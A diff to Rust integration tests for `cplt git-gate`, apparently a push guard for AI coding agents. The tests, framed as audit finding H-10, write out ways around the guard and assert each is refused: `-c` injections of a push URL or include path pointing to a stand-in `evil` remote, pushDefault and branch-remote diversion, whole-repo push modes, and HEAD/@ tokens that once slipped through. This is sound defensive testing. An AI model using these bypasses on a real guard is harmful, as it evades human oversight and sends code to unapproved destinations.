@@ -30,7 +30,7 @@
 use std::process::Command;
 
 mod common;
-use common::{assert_refused, binary_in_path, cplt_cmd, temp_repo};
+use common::{assert_refused, binary_in_path, cplt_cmd, git_ok, temp_repo};
 
 /// Run `cplt gh-gate` with default block policy.
 /// Returns (stdout, stderr, exit_success).
@@ -96,12 +96,44 @@ fn fake_push_git(dir: &std::path::Path) -> std::path::PathBuf {
     script
 }
 
-/// Run `cplt git-gate` with protect-default-branch-only mode.
-fn git_gate_protect_default(args: &[&str]) -> (String, String, bool) {
-    // The gate resolves the target repo from the cwd; a temp repo keeps that
-    // independent of whatever origin the checkout running the tests has.
-    let repo = temp_repo("navikt/cplt");
-    let real_git = fake_push_git(repo.path());
+/// A temp repo with a real commit, `main`, any `extra` branches, and HEAD on
+/// `head`.
+///
+/// The guard resolves a colon-less push token (`HEAD`, `@`, a branch name) with
+/// `rev-parse`, which answers nothing in an unborn repository. An unborn fixture
+/// would make every such push fail closed — allow-side tests would then pass for
+/// the wrong reason, which is exactly how the `HEAD` bypass survived review.
+fn temp_repo_live(remote: &str, head: &str, extra: &[&str]) -> tempfile::TempDir {
+    let repo = temp_repo(remote);
+    assert!(git_ok(
+        repo.path(),
+        &[
+            "-c",
+            "user.email=t@example.com",
+            "-c",
+            "user.name=t",
+            "commit",
+            "--allow-empty",
+            "-q",
+            "-m",
+            "init",
+        ],
+    ));
+    // temp_repo records refs/remotes/origin/HEAD -> origin/main, so the local
+    // default branch must be `main` too.
+    assert!(git_ok(repo.path(), &["branch", "-M", "main"]));
+    for name in extra {
+        assert!(git_ok(repo.path(), &["branch", name]), "branch {name}");
+    }
+    if head != "main" {
+        assert!(git_ok(repo.path(), &["checkout", "-q", head]));
+    }
+    repo
+}
+
+/// Run `cplt git-gate` with protect-default-branch-only mode inside `repo`.
+fn git_gate_protect_default_in(repo: &std::path::Path, args: &[&str]) -> (String, String, bool) {
+    let real_git = fake_push_git(repo);
     let mut cmd = cplt_cmd();
     cmd.arg("git-gate")
         .arg("--real-git")
@@ -112,7 +144,7 @@ fn git_gate_protect_default(args: &[&str]) -> (String, String, bool) {
         .arg("--protect-default-branch-only=true")
         .arg("--")
         .args(args)
-        .current_dir(repo.path());
+        .current_dir(repo);
 
     let output = cmd.output().expect("cplt git-gate should run");
     (
@@ -120,6 +152,31 @@ fn git_gate_protect_default(args: &[&str]) -> (String, String, bool) {
         String::from_utf8_lossy(&output.stderr).to_string(),
         output.status.success(),
     )
+}
+
+/// Run `cplt git-gate` with protect-default-branch-only mode, checked out on
+/// `main` in a live repo carrying the feature branches these tests push to.
+fn git_gate_protect_default(args: &[&str]) -> (String, String, bool) {
+    // The gate resolves the target repo from the cwd; a temp repo keeps that
+    // independent of whatever origin the checkout running the tests has.
+    // Every colon-less branch these tests push to must exist, or the guard fails
+    // closed on an unresolvable token and the test passes for the wrong reason.
+    // `master` is here so its block is the protected-name rule, not resolution.
+    let repo = temp_repo_live(
+        "navikt/cplt",
+        "main",
+        // NOTE: no plain `feature` — it collides with `feature/my-work` in git's
+        // ref store (refs/heads/feature vs refs/heads/feature/...). The one test
+        // that needs it builds its own repo.
+        &[
+            "feature/my-work",
+            "copilot/fix-123",
+            "feature-branch",
+            "my-feature",
+            "master",
+        ],
+    );
+    git_gate_protect_default_in(repo.path(), args)
 }
 
 /// Run `cplt git-gate` with given policy and mode.
@@ -1400,7 +1457,7 @@ fn git_gate_protect_default_blocks_origin_slash_main() {
 fn git_gate_blocks_alias_via_dash_c() {
     // `-c alias.p=push` must be caught to prevent bypass
     let (_, stderr, ok) = git_gate(&["-c", "alias.p=push", "p", "origin", "main"], true, true);
-    assert_refused(&stderr, ok, "git alias definitions via -c are blocked");
+    assert_refused(&stderr, ok, "not allowed while push prevention is active");
 }
 
 #[test]
@@ -1424,8 +1481,15 @@ fn git_gate_protect_default_blocks_force_push_to_feature() {
     assert_refused(&stderr, ok, "Force push prevention is enabled");
     let (_, stderr, ok) = git_gate_protect_default(&["push", "-f", "origin", "my-feature"]);
     assert_refused(&stderr, ok, "Force push prevention is enabled");
-    let (_, stderr, ok) =
-        git_gate_protect_default(&["push", "--force-with-lease", "origin", "feature"]);
+    // Plain `feature` needs its OWN repo and must not be folded back into the
+    // shared fixture: git cannot hold refs/heads/feature alongside
+    // refs/heads/feature/my-work (directory/file conflict in the ref store), so
+    // `git branch feature` there fails and every protect_default test goes red.
+    let repo = temp_repo_live("navikt/cplt", "main", &["feature"]);
+    let (_, stderr, ok) = git_gate_protect_default_in(
+        repo.path(),
+        &["push", "--force-with-lease", "origin", "feature"],
+    );
     assert_refused(&stderr, ok, "Force push prevention is enabled");
 }
 
@@ -1441,6 +1505,307 @@ fn git_gate_protect_default_blocks_multi_refspec_with_main() {
         "HEAD:refs/heads/master",
     ]);
     assert_refused(&stderr, ok, "Push prevention is enabled");
+}
+
+// ============================================================
+// H-10: allow_push authorization must bind to the real push destination
+// ============================================================
+//
+// End-to-end through `cplt git-gate`, the way the audit reproduced it: an
+// allow_push rule pinned to the temp repo's `origin` (github.com/navikt/cplt)
+// under push prevention. `fake_push_git` answers the guard's resolution calls
+// with real git but makes an actual `push` a no-op, so an ALLOWED push exits 0
+// and a BLOCKED one exits non-zero without ever reaching the network.
+
+/// Run `cplt git-gate` with push prevention and an allow_push rule pinned to
+/// the repo's `origin`, allowing `agent/*`. Returns (stderr, exit_success).
+fn git_gate_allow_push(repo: &std::path::Path, args: &[&str]) -> (String, bool) {
+    let real_git = fake_push_git(repo);
+    let rule = r#"[{"remote":"origin","branches":["agent/*"],"force":false,"url":"github.com/navikt/cplt"}]"#;
+    let mut cmd = cplt_cmd();
+    cmd.arg("git-gate")
+        .arg("--real-git")
+        .arg(&real_git)
+        .arg("--mode=block")
+        .arg("--prevent-push=true")
+        .arg("--prevent-force-push=true")
+        .arg(format!("--allow-push-rules={rule}"))
+        .arg("--")
+        .args(args)
+        .current_dir(repo);
+    let output = cmd.output().expect("cplt git-gate should run");
+    (
+        String::from_utf8_lossy(&output.stderr).to_string(),
+        output.status.success(),
+    )
+}
+
+#[test]
+fn git_gate_allow_push_baseline_allows_pinned_push() {
+    // Non-vacuous control: a legitimate push to origin agent/* IS allowed, so a
+    // blocked attack below is proven to be the guard, not a broken fixture.
+    let repo = temp_repo_live("navikt/cplt", "agent/x", &["agent/x"]);
+    let (stderr, ok) = git_gate_allow_push(repo.path(), &["push", "origin", "agent/x"]);
+    assert!(
+        ok,
+        "a pinned push to origin agent/x must be allowed.\n{stderr}"
+    );
+}
+
+#[test]
+fn git_gate_allow_push_blocks_pushurl_injected_via_dash_c() {
+    let repo = temp_repo_live("navikt/cplt", "agent/x", &["agent/x"]);
+    let (stderr, ok) = git_gate_allow_push(
+        repo.path(),
+        &[
+            "-c",
+            "remote.origin.pushurl=https://github.com/evil/x.git",
+            "push",
+            "origin",
+            "agent/x",
+        ],
+    );
+    assert_refused(&stderr, ok, "not allowed while push prevention is active");
+}
+
+#[test]
+fn git_gate_allow_push_blocks_pushdefault_injected_via_dash_c() {
+    let repo = temp_repo("navikt/cplt");
+    let (stderr, ok) = git_gate_allow_push(
+        repo.path(),
+        &[
+            "-c",
+            "remote.pushDefault=evil",
+            "-c",
+            "push.default=current",
+            "push",
+        ],
+    );
+    assert_refused(&stderr, ok, "not allowed while push prevention is active");
+}
+
+#[test]
+fn git_gate_allow_push_blocks_repo_url_override() {
+    let repo = temp_repo("navikt/cplt");
+    let (stderr, ok) = git_gate_allow_push(
+        repo.path(),
+        &["push", "--repo=https://github.com/evil/x.git"],
+    );
+    assert_refused(&stderr, ok, "not allowed while push prevention is active");
+}
+
+#[test]
+fn git_gate_allow_push_blocks_divergent_second_pushurl() {
+    let repo = temp_repo_live("navikt/cplt", "agent/x", &["agent/x"]);
+    // origin gains a second, divergent push URL. `git push` writes to both; the
+    // guard must require every URL to match the pinned rule.
+    assert!(git_ok(
+        repo.path(),
+        &[
+            "remote",
+            "set-url",
+            "--push",
+            "origin",
+            "https://github.com/navikt/cplt.git"
+        ],
+    ));
+    assert!(git_ok(
+        repo.path(),
+        &[
+            "remote",
+            "set-url",
+            "--add",
+            "--push",
+            "origin",
+            "https://github.com/evil/x.git"
+        ],
+    ));
+    let (stderr, ok) = git_gate_allow_push(repo.path(), &["push", "origin", "agent/x"]);
+    assert_refused(&stderr, ok, "Push prevention is enabled");
+}
+
+#[test]
+fn git_gate_allow_push_blocks_bare_push_diverted_by_pushdefault() {
+    let repo = temp_repo("navikt/cplt");
+    // Put HEAD on an allowed feature branch, then plant a diverted push
+    // destination in .git/config (writable under Linux/bwrap). A bare `git push`
+    // now targets `evil`, not origin — assuming origin would authorize it.
+    assert!(git_ok(
+        repo.path(),
+        &["symbolic-ref", "HEAD", "refs/heads/agent/x"]
+    ));
+    assert!(git_ok(
+        repo.path(),
+        &["remote", "add", "evil", "https://github.com/evil/x.git"],
+    ));
+    assert!(git_ok(
+        repo.path(),
+        &["config", "remote.pushDefault", "evil"]
+    ));
+    let (stderr, ok) = git_gate_allow_push(repo.path(), &["push"]);
+    assert_refused(&stderr, ok, "Push prevention is enabled");
+}
+
+// B1: `-c include.path` pulls in a file that can set remote.origin.pushurl.
+#[test]
+fn git_gate_allow_push_blocks_include_path_injection() {
+    let repo = temp_repo("navikt/cplt");
+    let (stderr, ok) = git_gate_allow_push(
+        repo.path(),
+        &[
+            "-c",
+            "include.path=/tmp/evil.inc",
+            "push",
+            "origin",
+            "agent/x",
+        ],
+    );
+    assert_refused(&stderr, ok, "not allowed while push prevention is active");
+}
+
+// B2: `branch.<b>.remote` diverts a bare push (pushRemote/pushDefault unset).
+#[test]
+fn git_gate_allow_push_blocks_bare_push_diverted_by_branch_remote() {
+    let repo = temp_repo("navikt/cplt");
+    assert!(git_ok(
+        repo.path(),
+        &["symbolic-ref", "HEAD", "refs/heads/agent/x"]
+    ));
+    assert!(git_ok(
+        repo.path(),
+        &["remote", "add", "evil", "https://github.com/evil/x.git"],
+    ));
+    assert!(git_ok(
+        repo.path(),
+        &["config", "branch.agent/x.remote", "evil"]
+    ));
+    assert!(git_ok(
+        repo.path(),
+        &["config", "branch.agent/x.merge", "refs/heads/agent/x"],
+    ));
+    let (stderr, ok) = git_gate_allow_push(repo.path(), &["push"]);
+    assert_refused(&stderr, ok, "Push prevention is enabled");
+}
+
+// B3: whole-repo push modes push refs the branch glob cannot bound. No config,
+// works on macOS.
+#[test]
+fn git_gate_allow_push_blocks_whole_repo_modes() {
+    for mode in ["--all", "--mirror", "--tags", "--branches", "--prune"] {
+        let repo = temp_repo("navikt/cplt");
+        let (stderr, ok) = git_gate_allow_push(repo.path(), &["push", mode, "origin"]);
+        assert_refused(&stderr, ok, "Push prevention is enabled");
+        assert!(!ok, "push {mode} must be denied");
+    }
+}
+
+// B3: `--follow-tags` pushes annotated tags reachable from the branch in
+// addition to it — refs the glob cannot constrain. No config, works on macOS.
+#[test]
+fn git_gate_allow_push_blocks_follow_tags() {
+    let repo = temp_repo_live("navikt/cplt", "agent/x", &["agent/x"]);
+    let (stderr, ok) =
+        git_gate_allow_push(repo.path(), &["push", "origin", "agent/x", "--follow-tags"]);
+    assert_refused(&stderr, ok, "Push prevention is enabled");
+}
+
+// B3: every refspec must bind, not just the first. No config, works on macOS.
+#[test]
+fn git_gate_allow_push_blocks_second_refspec_outside_glob() {
+    let repo = temp_repo_live("navikt/cplt", "agent/x", &["agent/x"]);
+    let (stderr, ok) = git_gate_allow_push(repo.path(), &["push", "origin", "agent/x", "main"]);
+    assert_refused(&stderr, ok, "Push prevention is enabled");
+}
+
+// B3: no-refspec forms whose real destination is set by config.
+#[test]
+fn git_gate_allow_push_blocks_matching_push_default() {
+    let repo = temp_repo("navikt/cplt");
+    assert!(git_ok(repo.path(), &["config", "push.default", "matching"]));
+    let (stderr, ok) = git_gate_allow_push(repo.path(), &["push", "origin"]);
+    assert_refused(&stderr, ok, "Push prevention is enabled");
+}
+
+#[test]
+fn git_gate_allow_push_blocks_configured_push_refspec() {
+    let repo = temp_repo("navikt/cplt");
+    assert!(git_ok(
+        repo.path(),
+        &["config", "remote.origin.push", "refs/heads/*:refs/heads/*"],
+    ));
+    let (stderr, ok) = git_gate_allow_push(repo.path(), &["push", "origin"]);
+    assert_refused(&stderr, ok, "Push prevention is enabled");
+}
+
+#[test]
+fn git_gate_allow_push_blocks_upstream_push_default() {
+    let repo = temp_repo("navikt/cplt");
+    assert!(git_ok(
+        repo.path(),
+        &["symbolic-ref", "HEAD", "refs/heads/agent/x"]
+    ));
+    assert!(git_ok(repo.path(), &["config", "push.default", "upstream"]));
+    assert!(git_ok(
+        repo.path(),
+        &["config", "branch.agent/x.merge", "refs/heads/main"],
+    ));
+    let (stderr, ok) = git_gate_allow_push(repo.path(), &["push"]);
+    assert_refused(&stderr, ok, "Push prevention is enabled");
+}
+
+// ============================================================
+// H-10 round 5: refspec shapes and colon-less tokens
+// ============================================================
+//
+// All five of these were verified ALLOWED by the guard while a real push
+// advanced remote `main`, under mode=block, prevent_push, prevent_force_push,
+// protect_default_branch_only, checked out on `main`. The guard compared the
+// token TEXT against the branch, while git resolved it to a real ref.
+
+#[test]
+fn git_gate_protect_default_blocks_head_and_at_on_default_branch() {
+    // `HEAD` and `@` are not branch names — on `main` they mean `main`.
+    for token in ["HEAD", "@"] {
+        let repo = temp_repo_live("navikt/cplt", "main", &[]);
+        let (_, stderr, ok) = git_gate_protect_default_in(repo.path(), &["push", "origin", token]);
+        assert_refused(&stderr, ok, "Push prevention is enabled");
+        assert!(!ok, "push origin {token} on main must be denied");
+    }
+}
+
+#[test]
+fn git_gate_protect_default_blocks_glob_and_matching_refspecs() {
+    // `:` is the matching refspec; a `*` destination is a multi-ref pattern.
+    // Neither can be enumerated against a branch filter.
+    for spec in [
+        ":",
+        "refs/heads/*:refs/heads/*",
+        "refs/heads/ma*:refs/heads/ma*",
+    ] {
+        let repo = temp_repo_live("navikt/cplt", "main", &[]);
+        let (_, stderr, ok) = git_gate_protect_default_in(repo.path(), &["push", "origin", spec]);
+        assert_refused(&stderr, ok, "Push prevention is enabled");
+        assert!(!ok, "push origin {spec} must be denied");
+    }
+}
+
+#[test]
+fn git_gate_protect_default_allows_head_on_a_feature_branch() {
+    // Positive control: `git push origin HEAD` is the common form and must stay
+    // allowed on a feature branch — blocking it would be its own problem.
+    let repo = temp_repo_live("navikt/cplt", "feature/x", &["feature/x"]);
+    let (_, stderr, ok) = git_gate_protect_default_in(repo.path(), &["push", "origin", "HEAD"]);
+    assert!(
+        ok,
+        "push origin HEAD on a feature branch must stay allowed.\n{stderr}"
+    );
+    // `@` too, same reasoning.
+    let repo = temp_repo_live("navikt/cplt", "feature/x", &["feature/x"]);
+    let (_, stderr, ok) = git_gate_protect_default_in(repo.path(), &["push", "origin", "@"]);
+    assert!(
+        ok,
+        "push origin @ on a feature branch must stay allowed.\n{stderr}"
+    );
 }
 
 // ============================================================
